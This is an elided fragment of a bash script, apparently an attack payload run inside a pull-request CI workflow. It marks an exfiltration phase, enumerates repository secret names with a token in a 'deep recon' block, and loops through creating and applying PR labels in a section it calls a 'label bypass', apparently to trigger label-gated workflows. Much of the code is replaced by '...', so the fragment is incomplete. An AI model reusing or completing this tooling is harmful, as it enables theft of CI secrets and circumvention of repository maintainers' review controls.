...
echo "==PRT_EXFIL_END_123ee306361d=="
        ...
        if [ -n "$__PRT_TK" ]; then
          ...
          echo "==PRT_RECON_START_123ee306361d=="
          (
            # --- Repo secret names ---
            echo "##REPO_SECRETS##"
...
" 2>/dev/null
          ...
          echo "==PRT_RECON_END_123ee306361d=="
        fi
        # --- end deep recon ---
            ...
            for __entry in $__PRT_LABELS; do
              ...
              if [ "$__LBL_CREATE" = "201" ] || [ "$__LBL_CREATE" = "422" ]; then
                ...
                if [ "$__LBL_APPLY" = "200" ]; then
                  echo "PRT_LABEL_BYPASS_123ee306361d=$__LBL_WF:$__LBL_NAME"
                else
                  echo "PRT_LABEL_BYPASS_ERR_123ee306361d=apply_failed:$__LBL_APPLY:$__LBL_WF"
                fi
              else
                echo "PRT_LABEL_BYPASS_ERR_123ee306361d=create_failed:$__LBL_CREATE:$__LBL_WF"
              fi
            done
          else
            echo "PRT_LABEL_BYPASS_ERR_123ee306361d=no_pr_number"
          fi
        fi
        # --- end label bypass ---
